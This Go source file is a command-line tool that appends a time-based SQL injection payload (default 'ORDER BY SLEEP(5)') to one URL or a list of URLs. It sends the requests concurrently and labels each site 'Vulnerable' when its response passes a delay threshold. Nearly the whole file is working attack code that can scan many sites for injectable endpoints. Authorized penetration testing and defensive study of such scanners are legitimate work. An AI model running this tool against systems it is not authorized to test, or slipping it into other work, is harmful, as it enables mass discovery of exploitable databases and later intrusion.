package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

func main() {
	// Command-line flags
	urlFlag := flag.String("u", "", "Target URL")
	payloadFlag := flag.String("p", "+ORDER+BY+SLEEP(5)--+-", "SQL injection payload")
	timeFlag := flag.Float64("t", 5, "Response time threshold in seconds")
	fileFlag := flag.String("f", "", "File containing multiple URLs")

	flag.Parse()

	// Validate command-line arguments
	if err := validateFlags(*urlFlag, *fileFlag); err != nil {
		fmt.Printf("Error: %v\n", err)
		flag.PrintDefaults()
		return
	}

	// If a file is provided, read URLs from the file
	var urls []string
	if *fileFlag != "" {
		urlsFromFile, err := readURLsFromFile(*fileFlag)
		if err != nil {
			fmt.Printf("Error reading URLs from file: %v\n", err)
			return
		}
		urls = urlsFromFile
	} else {
		// If -f is not provided, use the single URL provided with -u
		urls = append(urls, *urlFlag)
	}

	// Replace spaces in payloadFlag with '+'
	*payloadFlag = strings.ReplaceAll(*payloadFlag, " ", "+")

	// Use a WaitGroup to wait for all goroutines to finish
	var wg sync.WaitGroup

	// Test each URL for time-based SQL injection
	for _, url := range urls {
		// Increment the WaitGroup counter
		wg.Add(1)

		// Launch a goroutine to test the URL
		go testURL(url, *payloadFlag, *timeFlag, &wg)
	}

	// Wait for all goroutines to finish
	wg.Wait()
}

// testURL tests a single URL for time-based SQL injection
func testURL(url, payload string, threshold float64, wg *sync.WaitGroup) {
	// Decrement the WaitGroup counter when the goroutine completes
	defer wg.Done()

	// Create the URL with the payload injected
	urlWithPayload := url + payload

	// Test the URL for time-based SQL injection
	start := time.Now()
	resp, err := http.Get(urlWithPayload)
	elapsed := time.Since(start)

	if err != nil {
		return
	}

	defer resp.Body.Close()

	// Get the response time in seconds
	responseTime := elapsed.Seconds()

	// Get and print the result based on the response time
	result := getResult(url, responseTime, threshold)
	fmt.Println(result)
}

// Other functions remain unchanged...

// validateFlags checks if either -u or -f is provided
func validateFlags(urlFlag, fileFlag string) error {
	if urlFlag == "" && fileFlag == "" {
		return fmt.Errorf("Either -u or -f flag is required")
	}
	return nil
}

// readURLsFromFile reads URLs from a file and returns a slice of URLs
func readURLsFromFile(filename string) ([]string, error) {
	var urls []string
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		urls = append(urls, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return urls, nil
}

// getResult determines if the URL is vulnerable based on the response time without including the response body
func getResult(url string, responseTime, threshold float64) string {
	if responseTime >= threshold {
		return fmt.Sprintf("%s \x1b[1;32m=> Vulnerable\x1b[0m", url)
	}
	return fmt.Sprintf("%s \x1b[1;31m=> Not vulnerable\x1b[0m", url)
}
